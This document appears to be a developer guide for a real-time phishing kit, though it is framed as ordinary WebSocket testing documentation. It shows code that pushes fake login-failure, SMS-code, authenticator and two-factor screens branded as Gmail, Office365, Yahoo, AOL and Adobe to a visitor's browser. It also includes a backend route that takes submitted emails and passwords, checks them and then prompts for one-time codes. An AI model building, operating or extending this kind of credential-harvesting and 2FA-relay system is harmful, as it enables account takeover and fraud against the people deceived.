# WebSocket Testing Guide

This guide explains how to test the WebSocket functionality in the application.

## Prerequisites

1. Node.js installed
2. Dependencies installed: `npm install`
3. Application running: `npm start`

## Quick Start

### 1. Start the Server

```bash
npm start
```

The server will start on port 10000 (or the port specified in the PORT environment variable).

### 2. Open the Frontend

Open your browser and navigate to:
- Local development: `http://localhost:10000`
- Or use your deployed URL

### 3. Get the Session ID

Open the browser console (F12 or Cmd+Option+I on Mac). You should see a log message like:

```
WebSocket connected, sessionId: abc123xyz456
```

Copy this session ID.

### 4. Run the Demo Script

In a new terminal window, run:

```bash
node examples/websocket-demo.js abc123xyz456
```

(Replace `abc123xyz456` with your actual session ID)

This will trigger a sequence of UI state changes in the browser.

## Manual Testing

You can also test WebSocket commands manually using the browser console or a WebSocket client.

### Using Browser Console

Once connected, you can manually trigger states using the global helper function in the backend.

#### Example: Trigger Incorrect Password State

In the backend code or using a REPL connected to the server:

```javascript
global.sendWebSocketCommand('abc123xyz456', 'show_incorrect_password', {
  provider: 'Gmail'
});
```

#### Example: Trigger SMS Code Input

```javascript
global.sendWebSocketCommand('abc123xyz456', 'show_sms_code', {
  provider: 'Office365',
  phoneNumber: '+1 (***) ***-5678'
});
```

#### Example: Reset State

```javascript
global.sendWebSocketCommand('abc123xyz456', 'hide_state');
```

### Using a WebSocket Client

You can use tools like:
- [wscat](https://github.com/websockets/wscat): `wscat -c ws://localhost:10000/ws?sessionId=abc123`
- [Postman](https://www.postman.com/) with WebSocket support
- Browser extensions like "Simple WebSocket Client"

Example message to send:

```json
{
  "command": "show_incorrect_password",
  "data": {
    "provider": "Gmail"
  }
}
```

## Available UI States

### 1. Incorrect Password
```javascript
global.sendWebSocketCommand(sessionId, 'show_incorrect_password', {
  provider: 'Gmail' // or Office365, Yahoo, AOL, Adobe
});
```

### 2. SMS Code Input
```javascript
global.sendWebSocketCommand(sessionId, 'show_sms_code', {
  provider: 'Office365',
  phoneNumber: '+1 (***) ***-5678'
});
```

### 3. Authenticator Approval
```javascript
global.sendWebSocketCommand(sessionId, 'show_authenticator_approval', {
  provider: 'Yahoo',
  appName: 'Yahoo Account Key'
});
```

### 4. Two-Factor Authentication
```javascript
global.sendWebSocketCommand(sessionId, 'show_two_factor', {
  provider: 'Gmail'
});
```

### 5. Account Locked
```javascript
global.sendWebSocketCommand(sessionId, 'show_account_locked', {
  provider: 'AOL',
  message: 'Your account has been temporarily locked.'
});
```

### 6. Security Check
```javascript
global.sendWebSocketCommand(sessionId, 'show_security_check', {
  provider: 'Office365'
});
```

### 7. Reset/Hide State
```javascript
global.sendWebSocketCommand(sessionId, 'hide_state');
```

## Testing Different Providers

Each provider has its own visual theme:

- **Gmail/Google**: Blue (#4285f4)
- **Office365/Microsoft**: Blue (#0078d4)
- **Yahoo**: Purple (#6001d2)
- **AOL**: Blue (#0066cc)
- **Default/Adobe**: Generic blue (#0066cc)

Test each provider by changing the `provider` field in the data object.

## Troubleshooting

### "Connection refused" Error

- Make sure the server is running on the correct port
- Check that WebSocket upgrades are not blocked by a firewall or proxy

### "Session not found" in Logs

- The session ID might have disconnected
- Refresh the browser and get a new session ID

### State Not Changing in Browser

- Check the browser console for errors
- Verify the session ID is correct
- Check the server logs to see if the command was received

### WebSocket Disconnects Immediately

- Check if the session ID is provided in the URL
- Verify that the backend is properly handling WebSocket upgrades

## Integration with Backend Logic

In production, you would typically trigger these states based on backend logic:

```javascript
// Example: After processing login credentials
app.post('/api/login', async (req, res) => {
  const { email, password, sessionId } = req.body;
  
  // Validate credentials
  const result = await validateCredentials(email, password);
  
  if (!result.success) {
    // Trigger incorrect password state
    global.sendWebSocketCommand(sessionId, 'show_incorrect_password', {
      provider: detectProvider(email)
    });
  } else if (result.requiresSMS) {
    // Trigger SMS code input
    global.sendWebSocketCommand(sessionId, 'show_sms_code', {
      provider: detectProvider(email),
      phoneNumber: result.maskedPhone
    });
  }
  
  res.json({ success: true });
});
```

## Performance Considerations

- Each WebSocket connection consumes server resources
- Implement connection limits and timeouts in production
- Consider using Redis or similar for scaling across multiple server instances
- Implement heartbeat/ping-pong to detect dead connections

## Security Notes

- Always use WSS (secure WebSocket) in production
- Validate all session IDs
- Implement rate limiting
- Sanitize all data sent to the frontend
- Consider implementing authentication tokens
- Monitor for suspicious patterns

## Further Reading

- [WebSocket API Documentation](./WEBSOCKET_API.md)
- [MDN WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
- [ws Library Documentation](https://github.com/websockets/ws)
